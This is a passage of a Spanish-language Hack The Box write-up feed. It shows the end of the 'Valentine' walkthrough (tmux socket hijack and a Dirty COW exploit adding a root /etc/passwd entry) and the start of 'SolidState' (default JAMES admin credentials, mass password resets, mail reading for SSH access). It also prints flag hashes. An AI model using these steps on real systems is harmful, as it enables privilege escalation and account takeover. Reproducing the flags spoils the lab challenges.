&lt;p&gt;Podemos tratar de conectarnos por &lt;code&gt;ssh&lt;/code&gt; ya que tenemos la contraseña, pero como no sabemos el usuario al que corresponde, haciendo un poco de &lt;code&gt;guessing&lt;/code&gt; podemos probar con las palabras de la contraseña que obtuvimos.&lt;/p&gt;

&lt;p&gt;Probamos conectarnos como el usuario &lt;code&gt;hype&lt;/code&gt;, sin olvidar antes dar el permiso 600 a la &lt;code&gt;id_rsa&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ssh -i id_rsa hype@10.10.10.79
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
hype@Valentine:~$ whoami
hype
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y obtenemos acceso como el usuario &lt;code&gt;hype&lt;/code&gt;, ahora podemos visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;hype@Valentine:~$ cd /home
hype@Valentine:/home$ ls
hype
hype@Valentine:/home$ cd hype/
hype@Valentine:~$ cat user.txt 
a2d0b5e323869d9205016e1fb7a5630f
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Para elevar privilegios como el usuario podemos hacerlo de dos formas.&lt;/p&gt;

&lt;p&gt;Primero vamos a hacer de la primera manera que es que si revisamos los archivos ocultos del directorio del usuario &lt;code&gt;hype&lt;/code&gt;. Podemos observar que el &lt;code&gt;.bash_history&lt;/code&gt; no es un link simbolico al &lt;code&gt;/dev/null&lt;/code&gt; como de costumbre.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ype@Valentine:~$ ls -la
total 148
drwxr-xr-x 21 hype hype  4096 Aug 25  2022 .
drwxr-xr-x  3 root root  4096 Dec 11  2017 ..
-rw-------  1 hype hype   636 Dec 11  2017 .ICEauthority
-rw-------  1 hype hype     0 Dec 11  2017 .Xauthority
-rw-------  1 hype hype   131 Feb 16  2018 .bash_history
-rw-r--r--  1 hype hype   220 Dec 11  2017 .bash_logout
-rw-r--r--  1 hype hype  3486 Dec 11  2017 .bashrc
drwx------ 11 hype hype  4096 Dec 11  2017 .cache
drwx------  9 hype hype  4096 Dec 11  2017 .config
drwx------  3 hype hype  4096 Dec 11  2017 .dbus
-rw-r--r--  1 hype hype    26 Dec 11  2017 .dmrc
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 .fontconfig
drwx------  3 hype hype  4096 Dec 11  2017 .gconf
drwx------  4 hype hype  4096 Dec 11  2017 .gnome2
-rw-rw-r--  1 hype hype   132 Dec 11  2017 .gtk-bookmarks
drwx------  2 hype hype  4096 Dec 11  2017 .gvfs
drwxr-xr-x  3 hype hype  4096 Dec 11  2017 .local
drwx------  3 hype hype  4096 Dec 11  2017 .mission-control
-rw-r--r--  1 hype hype   675 Dec 11  2017 .profile
drwx------  2 hype hype  4096 Dec 11  2017 .pulse
-rw-------  1 hype hype   256 Dec 11  2017 .pulse-cookie
drwx------  2 hype hype  4096 Dec 13  2017 .ssh
-rw-r--r--  1 root root    39 Dec 13  2017 .tmux.conf
-rw-------  1 hype hype 12173 Dec 11  2017 .xsession-errors
-rw-------  1 hype hype  9659 Dec 11  2017 .xsession-errors.old
drwxr-xr-x  2 hype hype  4096 Aug 25  2022 Desktop
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Documents
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Downloads
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Music
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Pictures
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Public
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Templates
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Videos
-rw-rw-r--  1 hype hype    33 Jun 24 15:47 user.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si vemos el contenido del archivo, podemos los comandos que ejecuto el usuario entre ellos, unos de &lt;code&gt;tmux&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;hype@Valentine:~$ cat .bash_history 

exit
exot
exit
ls -la
cd /
ls -la
cd .devs
ls -la
tmux -L dev_sess 
tmux a -t dev_sess 
tmux --help
tmux -S /.devs/dev_sess 
exit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Entre los comandos usados con &lt;code&gt;tmux&lt;/code&gt;, vemos que uno de ellos hace alución a un &lt;code&gt;socket file&lt;/code&gt;, que basicamente viene a ser una sesión en modo &lt;code&gt;detached&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;hype@Valentine:~$ ls -l /.devs/dev_sess
srw-rw---- 1 root hype 0 Jun 24 15:47 /.devs/dev_sess
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como vemos que el usuario &lt;code&gt;root&lt;/code&gt; a abierto una sesión que a almacenado a un &lt;code&gt;socket file&lt;/code&gt; y este tiene como grupo asignado a &lt;code&gt;hype&lt;/code&gt;, podemos asociarnos al &lt;code&gt;socket file&lt;/code&gt; y nos convertiriamos en &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Simplemente debemos ejecutar el comando &lt;code&gt;tmux -S /.devs/dev_sess&lt;/code&gt; y ya estariamos como &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@Valentine:/home/hype# whoami
root
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La segunda forma de elevar privilegios seria explotar el kernel ya que si obervamos la versión que corresponde a la maquina es la &lt;code&gt;3.2.0&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;hype@Valentine:~$ uname -a
Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para ello podriamos usar el &lt;code&gt;dirty cow&lt;/code&gt;, para tratar de insertar en el &lt;code&gt;/etc/passwd&lt;/code&gt; un usuario nuevo con privilegios que operen como root.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit dirty cow
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page (1)                                                                               | linux/dos/43199.c
Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page (2)                                                                               | linux/dos/44305.c
Linux Kernel 2.6.22 &amp;lt; 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (SUID Method)                                   | linux/local/40616.c
Linux Kernel 2.6.22 &amp;lt; 3.9 - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (/etc/passwd Method)                                      | linux/local/40847.cpp
Linux Kernel 2.6.22 &amp;lt; 3.9 - 'Dirty COW PTRACE_POKEDATA' Race Condition (Write Access Method)                                                         | linux/local/40838.c
Linux Kernel 2.6.22 &amp;lt; 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)                                   | linux/local/40839.c
Linux Kernel 2.6.22 &amp;lt; 3.9 - 'Dirty COW' /proc/self/mem Race Condition (Write Access Method)                                                          | linux/local/40611.c
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para ello vamos a traernos el &lt;code&gt;exploit&lt;/code&gt;y vamos a ejecutarlo en la maquina victima.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit -m linux/local/40839.c
  Exploit: Linux Kernel 2.6.22 &amp;lt; 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)
      URL: https://www.exploit-db.com/exploits/40839
     Path: /usr/share/exploitdb/exploits/linux/local/40839.c
File Type: C source, ASCII text

Copied to: /home/fmiracle/Machines/Valentine/nmap/40839.c
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;En la maquina victima para poder ejecutarlo, si grepeamos por &lt;code&gt;gcc&lt;/code&gt; nos indica como hacerlo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;hype@Valentine:/tmp$ cat exploit.c | grep gcc
//   gcc -pthread dirty.c -o dirty -lcrypt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos y nos crea un compilado con el nombre de &lt;code&gt;dirty&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;hype@Valentine:/tmp$ gcc -pthread exploit.c -o dirty -lcrypt
hype@Valentine:/tmp$ ls
_cafenv-appconfig_  dirty  exploit.c  vmware-root
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al ejecutar el &lt;code&gt;dirty&lt;/code&gt; lo que hara sera pedirnos una contraseña, la cual asignara al usuario &lt;code&gt;firefart&lt;/code&gt; que tendra privilegios como &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;hype@Valentine:/tmp$ ./dirty 
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:fiWV.l3JFnVCk:0:0:pwned:/root:/bin/bash

mmap: 7fbb2afd5000
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si ahora revisamos el &lt;code&gt;/etc/passwd&lt;/code&gt;, vemos que nos creo el usuario exitosamente, ahora solo tenemos que migrar a el con la contraseña que introducimos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;hype@Valentine:/tmp$ cat /etc/passwd
firefart:fiWV.l3JFnVCk:0:0:pwned:/root:/bin/bash
/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
colord:x:103:108:colord colour management daemon,,,:/var/lib/colord:/bin/false
lightdm:x:104:111:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:105:114::/nonexistent:/bin/false
avahi-autoipd:x:106:117:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:107:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
usbmux:x:108:46:usbmux daemon,,,:/home/usbmux:/bin/false
kernoops:x:109:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:110:119:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:111:122:RealtimeKit,,,:/proc:/bin/false
speech-dispatcher:x:112:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false
saned:x:114:123::/home/saned:/bin/false
hype:x:1000:1000:Hemorrhage,,,:/home/hype:/bin/bash
sshd:x:115:65534::/var/run/sshd:/usr/sbin/nologin
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora nos convertimos en el usuario &lt;code&gt;firefart&lt;/code&gt;, vamos al directorio personal del usuario root y podemos visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;hype@Valentine:/tmp$ su firefart
Password: 
firefart@Valentine:/tmp# whoami
firefart
firefart@Valentine:/tmp# id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@Valentine:/tmp# cd /root
firefart@Valentine:~# cat root.txt 
c3261195d6711ce3bfa9bc76bfc43e4e
&lt;/code&gt;&lt;/pre&gt;
</description>
        <pubDate>Sat, 24 Jun 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Valentine</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Valentine</guid>
        
        <category>Information leaked</category>
        
        <category>Ssl Heartbleed Explotation</category>
        
        <category>Cracking Hashes</category>
        
        <category>Tmux Socket File Abusing</category>
        
        <category>Linux Kernel Explotation</category>
        
        <category>Dirty Cow</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina SolidState - htb writeup</title>
        <description>&lt;p&gt;Hola otra vez, el dia de hoy vamos a resolver la máquina &lt;code&gt;SolidState&lt;/code&gt; de la plataforma de &lt;code&gt;hackthebox&lt;/code&gt; correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt; de dificultad media, la cual vamos a explotar al conectarnos a un servicio de administración que nos permitira cambiar las contraseñas de usuarios de correo, y mediante ello obtendremos unas credenciales para conectarnos al sistema, donde una vez conectados haremos un bypass de una &lt;code&gt;restricted bash&lt;/code&gt; asignada y finalmente nos construiremos un script en bash para detectar tareas &lt;code&gt;cron&lt;/code&gt; y aprovecharemos una para poder convertinos en el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir SolidState
❯ ls
 SolidState
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.51
PING 10.10.10.51 (10.10.10.51) 56(84) bytes of data.
64 bytes from 10.10.10.51: icmp_seq=1 ttl=63 time=195 ms

--- 10.10.10.51 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 194.687/194.687/194.687/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;63&lt;/code&gt;correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt;, ahora procederemos a el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.51 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-24 21:26 GMT
Initiating SYN Stealth Scan at 21:26
Scanning 10.10.10.51 [65535 ports]
Discovered open port 25/tcp on 10.10.10.51
Discovered open port 110/tcp on 10.10.10.51
Discovered open port 80/tcp on 10.10.10.51
Discovered open port 22/tcp on 10.10.10.51
Discovered open port 4555/tcp on 10.10.10.51
Discovered open port 119/tcp on 10.10.10.51
Completed SYN Stealth Scan at 21:26, 18.27s elapsed (65535 total ports)
Nmap scan report for 10.10.10.51
Host is up, received user-set (0.21s latency).
Scanned at 2023-06-24 21:26:16 GMT for 18s
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
25/tcp   open  smtp    syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
110/tcp  open  pop3    syn-ack ttl 63
119/tcp  open  nntp    syn-ack ttl 63
4555/tcp open  rsip    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 18.41 seconds
           Raw packets sent: 86905 (3.824MB) | Rcvd: 85777 (3.431MB)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,25,80,110,119,4555 10.10.10.51 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-24 21:27 GMT
Nmap scan report for 10.10.10.51
Host is up (0.45s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.16.5 [10.10.16.5])
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Home - Solid State Security
|_http-server-header: Apache/2.4.25 (Debian)
110/tcp  open  pop3    JAMES pop3d 2.3.2
119/tcp  open  nntp    JAMES nntpd (posting ok)
4555/tcp open  rsip?
| fingerprint-strings: 
|   GenericLines: 
|     JAMES Remote Administration Tool 2.3.2
|     Please enter your login and password
|     Login id:
|     Password:
|     Login failed for 
|_    Login id:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4555-TCP:V=7.92%I=7%D=6/24%Time=64975FD6%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,7C,&quot;JAMES\x20Remote\x20Administration\x20Tool\x202\.3\.2\nPl
SF:ease\x20enter\x20your\x20login\x20and\x20password\nLogin\x20id:\nPasswo
SF:rd:\nLogin\x20failed\x20for\x20\nLogin\x20id:\n&quot;);
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 291.45 seconds

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;OpenSSH 7.4p1 Debian 10+deb9u1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;25&lt;/td&gt;
      &lt;td&gt;SMTP&lt;/td&gt;
      &lt;td&gt;JAMES smtpd 2.3.2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Apache httpd 2.4.25&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;110&lt;/td&gt;
      &lt;td&gt;POP3&lt;/td&gt;
      &lt;td&gt;JAMES pop3d 2.3.2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;119&lt;/td&gt;
      &lt;td&gt;NNTP&lt;/td&gt;
      &lt;td&gt;JAMES nntpd (posting ok)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4555&lt;/td&gt;
      &lt;td&gt;RSIP?&lt;/td&gt;
      &lt;td&gt;JAMES Remote Administration Tool 2.3.2&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotación&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ya que nmap nos reporta el el puerto 4555 un servicio de administración, vamos a tratar de conectarnos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ nc 10.10.10.51 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
admin
Password:
password
Login failed for admin
Login id:
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Obvervamos que el servicio nos pide unas credenciales, y si fallamos al tratar de conectarnos, pero podemos probar credenciales por defecto, en este caso usaremos &lt;code&gt;root:root&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ nc 10.10.10.51 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
HELP
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Logramos ingresar al servicio, y podemos ver que tenemos una lista de opciones que podemos usar, entre ellas una que corresponde a listar usuario y cambiarles la contraseña.&lt;/p&gt;

&lt;p&gt;Primero vamos a lista a todos los usuarios registrados.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ahora como no sabemos la contraseña de cada uno de estos, usaremos la opcion para modificarles la contraseña y le asignaremos a todos el mismo nombre de usuario.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;setpassword james james
Password for james reset
setpassword thomas thomas
Password for thomas reset
setpassword john john
Password for john reset
setpassword mindy mindy
Password for mindy reset
setpassword mailadmin mailadmin
Password for mailadmin reset
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como los usuarios corresponden a servicios de correo, vamos a conectarnos para inspeccionar si existe algun mail importante.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER james
+OK
PASS james
+OK Welcome james
LIST
+OK 0 0
.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si ahora probamos a conectarnos como el usuario &lt;code&gt;mindy&lt;/code&gt;, observamos que tiene dos correos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy
+OK
PASS mindy
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al leer el segundo correo, encontramos unas credenciales para conectarse por &lt;code&gt;ssh&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;RETR 2
+OK Message follows
Return-Path: &amp;lt;mailadmin@localhost&amp;gt;
Message-ID: &amp;lt;16744123.2.1503422270399.JavaMail.root@solidstate&amp;gt;
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for &amp;lt;mindy@localhost&amp;gt;;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Las credenciales son validas, pero al conectarnos vemos que estamos limitados por una restricted bash.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ssh mindy@10.10.10.51
The authenticity of host '10.10.10.51 (10.10.10.51)' can't be established.
ECDSA key fingerprint is SHA256:njQxYC21MJdcSfcgKOpfTedDAXx50SYVGPCfChsGwI0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.51' (ECDSA) to the list of known hosts.
mindy@10.10.10.51's password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
mindy@solidstate:~$ 
mindy@solidstate:~$ whoami
-rbash: whoami: command not found
mindy@solidstate:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora como podemos bypasear la &lt;code&gt;restricted bash&lt;/code&gt;, pues es muy sencillo; podemos usar como parametro &lt;code&gt;-t bash&lt;/code&gt; y de ejecutarse un docker en la maquina nos otorgara una sesión interactiva dentro del contenedor omitiendo las restricciones.&lt;/p&gt;

&lt;p&gt;Haciendo uso de lo mencionado, podemos volver a conectarnos y visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

